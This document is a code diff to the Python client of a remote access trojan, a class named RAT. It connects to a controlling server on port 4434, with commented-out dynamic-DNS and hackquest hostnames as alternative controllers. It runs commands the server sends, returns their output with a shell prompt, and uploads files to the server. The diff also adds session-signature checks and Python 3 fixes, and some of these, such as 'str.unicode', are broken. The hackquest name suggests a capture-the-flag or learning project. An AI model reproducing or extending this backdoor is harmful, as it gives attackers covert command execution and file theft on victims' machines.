@@ -108,8 +108,8 @@ import sys
 import time
 import socket
 import subprocess
-from client.core.secure.RAW import RAW
-from .config.ClientConfig import ClientConfig
+from src.client.core.secure.RAW import RAW
+from src.client.core.config import ClientConfig
 
 
 class RAT(RAW, ClientConfig):
@@ -118,16 +118,33 @@ class RAT(RAW, ClientConfig):
     def __init__(self):
         super(RAT, self).__init__()
 
-        self.start()
+        # initializer
 
-    # start the service
-    def start(self):
+    def __init(self):
+        # set new socket
+        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # set loopback address
+        self._loop = "127.0.0.1"  # socket.gethostbyname("localhost")
+        # domain.ddns.chickenkiller.com
+        # flipper.hackquest.com
+        # self._loop = 'flipper.hackquest.com'
+        # self._loop = socket.gethostbyname('flipper.hackquest.com')
+        # set new port
+        # cls._port = 4434
+        self._port = 4434
+        self._info = self.build_info()
+        self._isFTS = False
+        self._session_active = False
+        self._session_id = ""
+
+    # run the service
+    def run(self):
         while True:
             try:
-                self.init()
+                self.__init()
                 self.connect(self._loop, self._port)
                 data = self.receive()
-                if data == self.SIG:
+                if self.__check_sig_first_time(data):
                     self.FLAG = True
                     self.send(self._info + os.getcwd() + "> ")
                 while self.FLAG:
@@ -135,7 +152,7 @@ class RAT(RAW, ClientConfig):
                     data.lower()
                     std_output = self.command_manager(data)
                     # Send data to server
-                    std_output += "\n" + os.getcwd() + "> "
+                    std_output += ("\n" + os.getcwd() + "> ").encode()
                     std_output = std_output.decode('gbk').encode('utf-8', 'gb18030')
                     self.send(std_output)
                 if data == 'terminate':
@@ -144,6 +161,28 @@ class RAT(RAW, ClientConfig):
             except socket.error as e:
                 self.socket_err_manager(e)
                 continue
+
+    def __check_sig_first_time(self, data):
+        dmp = data[:17]
+        e = dmp[-1]
+        dmp = data[:16]
+        print(self.SIG, " ? ", dmp.encode())
+        if self.SIG == dmp.encode():
+            if not self.session_active() and not self._isFTS and len(data[17:]) > 0:
+                self._session_active = True
+                print(self._session_active)
+                self._isFTS = True
+                print(self._isFTS)
+                self._session_id = data[17:]
+                print(self._session_id)
+                print(data)
+                return True
+            elif self.session_active() and self._isFTS:
+                return True
+            return False
+
+    def session_active(self):
+        return self._session_active
 
     # bind connection
     def connect(self, ip, port):
@@ -154,7 +193,7 @@ class RAT(RAW, ClientConfig):
         data = ''
         pkt = self._sock.recv(self.BUFFER)
         while pkt:
-            data += pkt
+            data = data + pkt.decode()
             if data:
                 break
             else:
@@ -163,7 +202,7 @@ class RAT(RAW, ClientConfig):
 
     # send data
     def send(self, cmd):
-        self._sock.sendall(cmd)
+        self._sock.sendall(cmd.encode())
 
     # command manager - given data/cmd
     def command_manager(self, cmd):
@@ -220,32 +259,39 @@ class RAT(RAW, ClientConfig):
     # socket error handler
     def socket_err_manager(self, error_type):
         # Connection refused
-        if error_type[0] is 61:
+        print(error_type)
+        if "61" in error_type.strerror:
             self.stop()
             time.sleep(self.LONG_INTERVAL)
-            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
+            print("{0}\n-------".format(error_type))
+            pass
         # Socket is not connected
-        if error_type[0] is 57:
+        elif "57" in error_type.strerror:
             self.stop()
-            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
+            print("{0}\n-------".format(error_type))
             time.sleep(self.LONG_INTERVAL)
+            pass
         # Bad file descriptor
-        elif error_type[0] is 9:
+        elif "9" in error_type.strerror:
             self.stop()
-            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
+            print("{0}\n-------".format(error_type))
             time.sleep(self.LONG_INTERVAL)
+            pass
         # Broken Pipe
-        elif error_type[0] is 32:
+        elif "32" in error_type.strerror:
             self.stop()
-            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
+            print("{0}\n-------".format(error_type))
             time.sleep(self.LONG_INTERVAL)
+            pass
         else:
             self.stop()
-            print("CODE: {0}\nMSG: {1}".format(error_type[0], error_type[1]))
+            print("{0}\n-------".format(error_type))
             time.sleep(self.LONG_INTERVAL)
+            pass
 
     # stop socket connection
     def stop(self):
+        self._isFTS = False
         self._sock.close()
 
     # kill socket connection
@@ -267,7 +313,7 @@ class RAT(RAW, ClientConfig):
 
     # upload content to server
     def upload(self, fn):
-        filename = unicode(fn, "utf8")
+        filename = str.unicode(fn, "utf8")
         # bgtr = True
         # file transfer
         try:
@@ -290,6 +336,7 @@ class RAT(RAW, ClientConfig):
 
 def main():
     rat = RAT()
+    rat.run()
 
 
 if __name__ == '__main__':
